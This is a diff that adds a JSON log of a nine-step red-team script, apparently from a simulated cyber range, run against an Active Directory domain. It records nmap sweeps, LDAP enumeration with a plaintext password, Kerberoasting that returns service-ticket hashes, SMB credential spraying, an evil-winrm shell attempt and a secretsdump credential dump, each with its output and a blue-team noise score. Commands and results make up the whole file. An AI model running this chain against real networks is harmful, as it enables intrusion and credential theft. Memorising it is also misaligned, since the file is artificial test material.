@@ -1,0 +1,82 @@
+{
+  "script_name": "Noisy Recon & Lateral Movement Overload",
+  "total_steps": 9,
+  "steps_completed": 9,
+  "success": true,
+  "step_results": [
+    {
+      "step_number": 1,
+      "command": "nmap -p- 10.0.1.0/24",
+      "output": "Starting Nmap 7.94SVN ( https://nmap.org )\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 3.21 seconds",
+      "noise_generated": 15,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 2,
+      "command": "nmap -sV -p- 10.0.2.0/24",
+      "output": "Starting Nmap 7.94SVN ( https://nmap.org )\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 3.21 seconds",
+      "noise_generated": 15,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 3,
+      "command": "nmap -sC -sV 10.0.1.10",
+      "output": "Starting Nmap 7.94SVN ( https://nmap.org )\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 3.21 seconds",
+      "noise_generated": 5,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 4,
+      "command": "ldapsearch -x -h 10.0.1.247 -D 'b.wright' -w 'Hello123' -b 'DC=WEST,DC=local'",
+      "output": "# extended LDIF\n#\n# LDAPv3\n# base <DC=WEST,DC=local> with scope subtree\n# filter: (objectClass=person)\n# requesting: ALL\n#\n\n# Brian Wright\ndn: CN=Brian Wright,OU=Facilities,DC=WEST,DC=local\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Brian Wright\nsAMAccountName: b.wright\nuserPrincipalName: b.wright@WEST.local\ndistinguishedName: CN=Brian Wright,OU=Facilities,DC=WEST,DC=local\nobjectSid: S-1-5-21-1107420369-4184935163-2181241943-59978\nmemberOf: CN=Do...",
+      "noise_generated": 5,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 5,
+      "command": "GetUserSPNs WEST.local/b.wright:Hello123 -dc-ip 10.0.1.247 -request",
+      "output": "Impacket v0.11.0 - Copyright 2023 Fortra\n\nServicePrincipalName                    Name                    MemberOf\n--------------------------------------  ----------------------  --------\nFTP/WS03.WEST.local                     sa_sync                 DomainUsers\nMSSQLSvc/WS02.WEST.local:1433           sa_reporting            DomainUsers\n\n\n$krb5tgs$23$*sa_sync$WEST$WEST.local/sa_sync*$611cebe05bcbae2e8ddfa3d757d64c43$1c95f6bb47f97eaed5c4abf5ad3707c9f1afe1d04af523aae96d849996bb042eab3b1188bac78e5...",
+      "noise_generated": 5,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 6,
+      "command": "GetUserSPNs WEST.local/b.wright:Hello123 -dc-ip 10.0.1.247 -request",
+      "output": "Impacket v0.11.0 - Copyright 2023 Fortra\n\nServicePrincipalName                    Name                    MemberOf\n--------------------------------------  ----------------------  --------\nFTP/WS03.WEST.local                     sa_sync                 DomainUsers\nMSSQLSvc/WS02.WEST.local:1433           sa_reporting            DomainUsers\n\n\n$krb5tgs$23$*sa_sync$WEST$WEST.local/sa_sync*$611cebe05bcbae2e8ddfa3d757d64c43$1c95f6bb47f97eaed5c4abf5ad3707c9f1afe1d04af523aae96d849996bb042eab3b1188bac78e5...",
+      "noise_generated": 5,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 7,
+      "command": "crackmapexec smb 10.0.1.0/24 -u b.wright -p Hello123 --local-auth",
+      "output": "SOC Action: Suspicious Kerberos/SMB anomalies. Service accounts rotating or disabled temporarily.\n\nSMB         10.0.1.61       445    DC01            [+] WEST\\b.wright:Hello123 \nSMB         10.0.1.67       445    DC02            [+] WEST\\b.wright:Hello123 \nSMB         10.0.2.19       445    WS01            [+] WEST\\b.wright:Hello123 \nSMB         10.0.1.121      445    MAIL01          [+] WEST\\b.wright:Hello123 \nSMB         10.0.2.75       445    WS02            [+] WEST\\b.wright:Hello123 \nSMB   ...",
+      "noise_generated": 25,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 8,
+      "command": "evil-winrm -i 10.0.1.55 -u b.wright -p Hello123",
+      "output": "Error: Cannot connect to 10.0.1.55",
+      "noise_generated": 5,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    },
+    {
+      "step_number": 9,
+      "command": "secretsdump b.wright:Hello123@10.0.1.55",
+      "output": "Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] ERROR: \\: STATUS_LOGON_FAILURE (The attempted logon is invalid)",
+      "noise_generated": 5,
+      "blue_team_blocked": false,
+      "mitigation_reason": null
+    }
+  ],
+  "final_noise_level": 85,
+  "blocked_at_step": null
+}
